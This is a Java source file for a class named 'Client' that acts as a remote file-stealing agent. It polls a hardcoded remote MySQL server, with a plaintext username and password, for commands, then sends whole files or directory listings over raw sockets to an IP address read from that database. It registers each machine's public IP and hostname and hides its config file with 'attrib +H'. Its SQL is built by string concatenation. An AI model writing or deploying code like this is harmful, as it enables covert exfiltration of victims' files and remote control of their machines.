import java.awt.Desktop;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.Properties;

public class Client extends Thread {
public static void main(String[] args) throws Exception{
		
	
		Connection conn=null;
 while(conn==null) 
 {
	 try {
		
	 conn=conn();
		 
	 }catch(Exception e) 
	 {
		 continue;
	 }
	
 }
 


		while(true) {
			try {
	
				String loc=hostName();
				 String ip1=MyIp();
				String id=Id();
			
			
			int lenConn=CanConnect(conn,id,ip1,loc);
			int optLen=OptionsLen(conn,id,ip1,loc);
			if(getClientsLen(conn,Id(),MyIp(),loc)==0) 
			{
				
				 SendIp(conn,id,loc);
			}
			
			
			
		
			
		if(lenConn==1&&optLen==0) {
		
		SendFiles(getCommand(conn,id,ip1,loc),conn,id,CommandIp(conn,id),ip1,loc);
	
	

		}else if(optLen==1) 
		{
		
			SendNames(conn,getOption(conn,id,ip1,loc),id,OptionIp(conn,id),ip1,loc);
			
		}
		
			 }
		
			catch(Exception e)
			{
			
				conn=conn();
				continue;
			
			}
			
		}
		}
public static void SendFiles(String file,Connection conn,String id,String ip,String ip1,String loc) throws Exception

{
	
	Socket sock = new Socket(ip, 80);
	 
    File myFile = new File(file);
	DeleteRows(conn,"Delete From commands Where id ="+"'"+id+"'"+" And ip ="+"'"+ip1+"'"+" And locIp ="+"'"+loc+"'");
    byte[] mybytearray = new byte[(int) myFile.length()];
     
    FileInputStream fis = new FileInputStream(myFile);
    BufferedInputStream bis = new BufferedInputStream(fis);
    bis.read(mybytearray, 0, mybytearray.length);
     
    OutputStream os = sock.getOutputStream();
     
    os.write(mybytearray, 0, mybytearray.length);
     
    os.flush();
     
    sock.close();
}
public static void DeleteRows(Connection conn,String commands) throws Exception 
{
	PreparedStatement ps1=null;
  ps1=conn.prepareStatement(commands);
   
  

	ps1.executeUpdate();
	ps1.close();
    
}
public static Connection conn() throws Exception
{
	Connection conn = null;
	
	
	String url = "jdbc:mysql://18.188.255.221:3306/";
	String dbName = "java";
	String driver = "com.mysql.cj.jdbc.Driver";
	String userName = "acho";
	
	String password = "1234";
	Class.forName(driver).newInstance();
	
	conn = DriverManager.getConnection(url+dbName,userName,password);

	
	if(conn!=null) {
	return conn;
	}
	return null;
}
public static int CanConnect(Connection conn,String id,String ip,String loc) throws Exception
{
	PreparedStatement statement=null;

	String sql1 = "SELECT COUNT(*) FROM commands Where id= "+"'"+id+"'"+" And ip ="+"'"+ip+"'"+" And locIp ="+"'"+loc+"'";
	
	 statement = null;
    ResultSet resultSet = null;
    statement = conn.prepareStatement(sql1);
    resultSet = statement.executeQuery();
    int out=0;
    if(resultSet.next()) {
      out=resultSet.getInt(1);

  
    }
    statement.close();
return out;
}
public static String getCommand(Connection conn,String id,String ip,String loc) throws Exception
{
	
	Statement stmt = conn.createStatement();
	String sql = "SELECT * from commands Where id ="+"'"+id+"'"+" And ip ="+"'"+ip+"'"+" And locIp ="+"'"+loc+"'";
	ResultSet rs = stmt.executeQuery(sql);
	String comm="";
   while(rs.next()) {
comm= rs.getString(1);
   }
   if(comm.charAt(comm.length()-1)=='\\') 
   {
	   comm=comm.substring(0,comm.length()-1);
	   
   }
stmt.close();
    return comm;
}
public static int OptionsLen(Connection conn,String id,String ip,String loc) throws Exception
{
	PreparedStatement statement=null;
	String sql1 = "SELECT COUNT(*) FROM options Where id="+"'"+id+"'"+" And ip ="+"'"+ip+"'"+" And locIp ="+"'"+loc+"'";
	 statement = null;
    ResultSet resultSet = null;
    statement = conn.prepareStatement(sql1);
    resultSet = statement.executeQuery();
    int out=0;
    if(resultSet.next()) {
      out=resultSet.getInt(1);

  
    }
    statement.close();
return out;	
}
public static String getOption(Connection conn,String id,String ip,String loc) throws Exception
{
	Statement stmt = conn.createStatement();
	String sql = "SELECT * from options Where id ="+"'"+id+"'"+" And ip ="+"'"+ip+"'"+" And locIp ="+"'"+loc+"'";
	ResultSet rs = stmt.executeQuery(sql);
	String comm="";
   while(rs.next()) {
comm= rs.getString(1);
   }
stmt.close();
    return comm;
}
public static void SendNames(Connection conn,String dir,String id,String ip,String ip1,String loc) throws Exception
{

	
Socket socket=new Socket(ip,80);
ObjectOutputStream dos=new ObjectOutputStream(socket.getOutputStream());
String[] pathnames;
File f = new File(dir);
DeleteRows(conn,"Delete From options Where id ="+"'"+id+"'"+" And ip ="+"'"+ip1+"'"+" And locIp ="+"'"+loc+"'");
pathnames=f.list();

dos.writeObject(pathnames);

}
public static String Id() 
{
	File configFile = new File(System.getProperty("user.dir")+"\\.conf.properties");
	String host=null;
	try {
	    FileReader reader = new FileReader(configFile);
	    Properties props = new Properties();
	    props.load(reader);
	 
	    host = props.getProperty("ID");
	 

	    reader.close();
	} catch (Exception ex) {
	 
	}
	return host;	
}
public static String CommandIp(Connection conn,String id) throws Exception 
{
	Statement stmt = conn.createStatement();
	String sql = "SELECT SerIp from commands Where id ="+"'"+id+"'";
	ResultSet rs = stmt.executeQuery(sql);
	String comm="";
   while(rs.next()) {
comm= rs.getString(1);
   }
stmt.close();
    return comm;
		
}
public static void WriteClientProperty(String id) throws Exception
{
	File theDir = new File(System.getProperty("user.dir")+"\\Clients");
	if (!theDir.exists()){
	    theDir.mkdirs();
	}
	 Properties props = new Properties();
	    props.setProperty("ID", id);
     
	    props.store(new FileOutputStream(theDir+"\\.conf.properties"), null);
        File f=new File(theDir+"\\.conf.properties");
        setHiddenAttrib(f);
}
public static String OptionIp(Connection conn,String id) throws Exception 
{
	Statement stmt = conn.createStatement();
	String sql = "SELECT SerIp from options Where id ="+"'"+id+"'";
	ResultSet rs = stmt.executeQuery(sql);
	String comm="";
   while(rs.next()) {
comm= rs.getString(1);
   }
stmt.close();
    return comm;
		
}
private static void setHiddenAttrib(File file) throws Exception {
   
     
      Process p = Runtime.getRuntime().exec("attrib +H " + file.getPath());
      
      p.waitFor(); 
     
  
  }
public static void SendIp(Connection conn,String id,String loc) throws Exception
{
	PreparedStatement ps=conn.prepareStatement("insert into clients values(?,?,?)");
	URL whatismyip = new URL("http://checkip.amazonaws.com");
	BufferedReader in = new BufferedReader(new InputStreamReader(
	                whatismyip.openStream()));

	String ip = in.readLine(); 

	ps.setString(1,ip);
	ps.setString(2,id);
	ps.setString(3, loc);
	ps.executeUpdate();
	
}
public static int getClientsLen(Connection conn,String id,String ip,String loc) throws Exception
{
	PreparedStatement statement=null;
	String sql1 = "SELECT COUNT(*) FROM clients Where ip="+"'"+ip+"'"+" And id="+"'"+id+"'"+" And locIp ="+"'"+loc+"'";
	 statement = null;
    ResultSet resultSet = null;
    statement = conn.prepareStatement(sql1);
    resultSet = statement.executeQuery();
    int out=0;
    if(resultSet.next()) {
      out=resultSet.getInt(1);

  
    }
    statement.close();
return out;	
}

public static String MyIp() throws Exception 
{
	URL whatismyip = new URL("http://checkip.amazonaws.com");
	BufferedReader in = new BufferedReader(new InputStreamReader(
	                whatismyip.openStream()));

	String ip = in.readLine(); 	
return ip;
}

public static String hostName() throws Exception
{
	 InetAddress ip;
     String hostname="";
     
         ip = InetAddress.getLocalHost();
         hostname = ip.toString();
    
      
         
       

     
     return hostname;
}

}